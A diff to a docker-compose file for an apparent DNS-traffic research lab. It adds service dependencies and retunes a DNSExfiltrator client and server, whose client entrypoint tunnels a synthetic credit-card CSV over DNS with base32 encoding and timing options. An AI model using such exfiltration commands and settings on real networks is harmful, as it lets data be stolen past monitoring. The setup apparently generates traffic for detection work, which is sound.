@@ -34,6 +34,8 @@ services:
       ip link set replay0 up &&
       echo '✓ replay0 created and ready' && tail -f /dev/null"
       ]
+    depends_on:
+      - resolver
     profiles:
       - essential
 
@@ -50,6 +52,9 @@ services:
       - ./dns-collector/config/:/etc/dnscollector/
       - ./dns-collector/logs:/var/log/dnscollector
     restart: unless-stopped
+    depends_on:
+      - resolver
+      - tcpreplay
     profiles:
       - essential
 
@@ -143,15 +148,13 @@ services:
       server-network:
         ipv4_address: 192.168.3.3
     
-
-
   dnsexfiltrator-client:
     container_name: dnsexfiltrator-client
     profiles: ["dnsexfiltrator"]
     volumes:
       - ./dnsexfiltrator-client/data:/data/
     build: ./dnsexfiltrator-client
-    entrypoint: ["/bin/sh", "-c", "sleep 10 && mono DNSExfiltrator.exe /data/synthetic_cc_data_10000.csv /data/domains.txt tunframe s=172.16.0.2 l=63 t=100 e=base32 seq=LCR"]
+    entrypoint: ["/bin/sh", "-c", "sleep 10 && mono DNSExfiltrator.exe /data/synthetic_cc_data_100.csv /data/domains.txt tunframe s=172.16.0.2 t=20000 tr=20000 l=10 e=base32map seq=ENC dil=20"]
     networks:
       client-network:
         ipv4_address: 172.16.40.40
@@ -164,7 +167,7 @@ services:
     build: ./dnsexfiltrator-server
     volumes:
       - ./dnsexfiltrator-server/volume/:/app/
-    entrypoint: ["python3", "-u", "dnsExfiltrator.py", "-f", "domains.txt", "-p", "tunframe", "-o", "test", "-s", "LCR"]
+    entrypoint: ["python3", "-u", "dnsExfiltrator.py", "-f", "domains.txt", "-p", "tunframe", "-o", "test", "-s", "ENC"]
     networks:
       server-network:
         ipv4_address: 192.168.4.4
